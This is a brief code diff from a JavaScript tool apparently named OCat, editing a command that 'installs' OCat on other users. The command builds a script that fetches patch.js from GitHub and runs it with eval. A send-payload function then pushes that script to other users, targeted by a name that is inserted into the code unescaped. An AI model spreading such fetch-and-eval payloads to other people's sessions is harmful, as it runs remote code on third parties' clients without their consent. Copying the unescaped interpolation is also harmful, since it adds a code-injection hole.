@@ -196,7 +196,7 @@ var ocat = {
 				args.shift();
 				var user = args.join(" ");
 				var script = `fetch('https://raw.githubusercontent.com/wntiv-main/ocat/main/patch.js').then(r => r.text().then(eval));`;
-				if(user) script = `if(window.name == '${user}') ${script}`;
+				if(user) script = `if(username == '${user}') ${script}`;
 				ocat._sendJsPayload(script);
 			},
 			description: () => "Install OCat on another user, or on all users."
